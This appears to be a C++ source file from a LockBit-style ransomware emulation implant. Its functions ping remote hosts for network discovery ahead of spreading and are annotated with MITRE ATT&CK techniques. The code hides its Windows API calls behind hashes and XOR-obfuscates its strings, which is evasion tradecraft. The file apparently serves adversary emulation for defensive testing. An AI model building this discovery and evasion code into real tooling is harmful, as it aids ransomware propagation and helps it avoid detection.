#include <format>
#include <stdexcept>
#include <vector>
#include "crypto/xor_obfuscation.hpp"
#include "logger.hpp"
#include "propagate.hpp"

namespace propagate {

/*
 * sendPing:
 *      About:
 *          Pings the specified target IP address using the IcmpSendEcho API call.
 *      Result:
 *          True on successful ping, false otherwise.
 *      MITRE ATT&CK Techniques:
 *          T1018: Remote System Discovery
 *          T1106: Native API
 *      CTI:
 *          https://thedfirreport.com/2020/06/10/lockbit-ransomware-why-you-no-spread/
 *      Other References:
 *           https://learn.microsoft.com/en-us/windows/win32/api/icmpapi/nf-icmpapi-icmpsendecho
 */
bool sendPing(unsigned long ip_addr, const std::string& ip_addr_str, HANDLE h_icmp_file) {
    DWORD error_code;
    FP_IcmpSendEcho icmpSendEcho = (FP_IcmpSendEcho)winapi_helper::GetAPI(0x8fb64697, XOR_WIDE_LIT(L"Iphlpapi.dll"), &error_code);
    if (icmpSendEcho == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for IcmpSendEcho. Error code"), error_code));
        return false;
    }

    char send_buf[32] = "hello";
    size_t resp_buf_size = sizeof(ICMP_ECHO_REPLY) + sizeof(send_buf);
    std::vector<char> resp_buf(resp_buf_size);
    DWORD result = icmpSendEcho(h_icmp_file, (IPAddr)ip_addr, send_buf, sizeof(send_buf), NULL, (LPVOID)(&resp_buf[0]), 
                                resp_buf_size, PING_TIMEOUT_MS);
    if (result == 0) { // 0 is failure for IcmpSendEcho
        XorLogger::LogError(std::format("{} {}. GetLastError: {}", XOR_LIT("IcmpSendEcho failed for"), ip_addr_str, GetLastError()));
        return false;
    }

    // Check response status
    PICMP_ECHO_REPLY pEchoReply = (PICMP_ECHO_REPLY)(&resp_buf[0]);
    if (pEchoReply->Status != IP_SUCCESS) {
        XorLogger::LogError(std::format("{} {}: {}", XOR_LIT("Unsuccessful IcmpSendEcho response status from"), ip_addr_str, pEchoReply->Status));
        return false;
    }
    return true;
}


/*
 * PingRemoteHost:
 *      About:
 *          Pings the specified target IP address using the IcmpCreateFile and IcmpSendEcho API calls.
 *      Result:
 *          True on successful ping, false otherwise.
 *      MITRE ATT&CK Techniques:
 *          T1018: Remote System Discovery
 *          T1106: Native API
 *      CTI:
 *          https://thedfirreport.com/2020/06/10/lockbit-ransomware-why-you-no-spread/
 *      Other References:
 *           https://learn.microsoft.com/en-us/windows/win32/api/icmpapi/nf-icmpapi-icmpsendecho
 */
bool PingRemoteHost(const std::string& ip_addr_str) {
    DWORD error_code;
    FP_IcmpCreateFile icmpCreateFile = (FP_IcmpCreateFile)winapi_helper::GetAPI(0x387fb7a2, XOR_WIDE_LIT(L"Iphlpapi.dll"), &error_code);
    if (icmpCreateFile == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for IcmpCreateFile. Error code"), error_code));
        return false;
    }
    FP_IcmpCloseHandle icmpCloseHandle = (FP_IcmpCloseHandle)winapi_helper::GetAPI(0x9550b030, XOR_WIDE_LIT(L"Iphlpapi.dll"), &error_code);
    if (icmpCloseHandle == NULL || error_code != ERROR_SUCCESS) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to get address for IcmpCloseHandle. Error code"), error_code));
        return false;
    }

    unsigned long ip_addr = inet_addr(ip_addr_str.c_str());
    if (ip_addr == INADDR_NONE) {
        XorLogger::LogError(std::format("{} {}", XOR_LIT("PingRemoteHost: Invalid IP address string:"), ip_addr_str));
        return false;
    }

    HANDLE h_icmp_file = icmpCreateFile();
    if (h_icmp_file == INVALID_HANDLE_VALUE) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("IcmpCreateFile failed to get handle. GetLastError"), GetLastError()));
        return false;
    }

    bool result = false;
    try {
        result = sendPing(ip_addr, ip_addr_str, h_icmp_file);
    } catch (const std::exception& e) {
        XorLogger::LogError(std::format("{} {}: {}", XOR_LIT("Caught exception when sending ping to"), ip_addr_str, e.what()));
    } catch (...) {
        XorLogger::LogError(std::format("{} {}:", XOR_LIT("Caught unknown exception when sending ping to"), ip_addr_str));
    }
    icmpCloseHandle(h_icmp_file);
    return result;
}

} // namespace